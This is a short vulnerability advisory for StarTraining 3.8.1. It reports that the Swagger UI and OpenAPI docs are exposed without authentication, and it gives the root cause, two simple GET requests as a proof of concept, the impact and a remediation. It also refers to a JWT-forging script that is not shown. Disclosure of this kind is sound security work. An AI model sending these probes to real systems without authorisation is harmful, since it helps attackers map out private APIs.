# StarTraining — Unauthenticated Swagger / api-docs exposure (ST-VULN-003)

| Field | Value |
|-------|-------|
| Vendor | zhistaredu |
| Product | StarTraining |
| Version | 3.8.1 |
| Type | Missing Authentication |
| CWE | CWE-306 / CWE-200 |
| Authentication | None |
| Severity | High |

## Summary

Swagger UI and `/v3/api-docs` are anonymous while swagger is enabled.

## Root cause

SecurityConfig anonymous matchers for swagger paths.

## Exploit / reproduction

Open in browser (no auth):

- [http://127.0.0.1:8900/swagger-ui/index.html](http://127.0.0.1:8900/swagger-ui/index.html)
- [http://127.0.0.1:8900/v3/api-docs](http://127.0.0.1:8900/v3/api-docs)


## PoC (Yakit)

```http
GET /swagger-ui/index.html HTTP/1.1
Host: 127.0.0.1:8900
Connection: close

---
GET /v3/api-docs HTTP/1.1
Host: 127.0.0.1:8900
Connection: close
```

Expected: HTTP 200 Swagger UI or OpenAPI JSON listing all endpoints

## Screenshots

![swagger](./screenshots/ST-VULN-003-swagger.png)

## Impact

Full API surface enumeration for attackers.

## Remediation

Disable swagger in production or require admin auth.

## References

- Local report: `../POC_VERIFICATION_REPORT.md`
- Scripts: `poc_verify/startraining_poc_verify.py`, `startraining_jwt_forge.py`
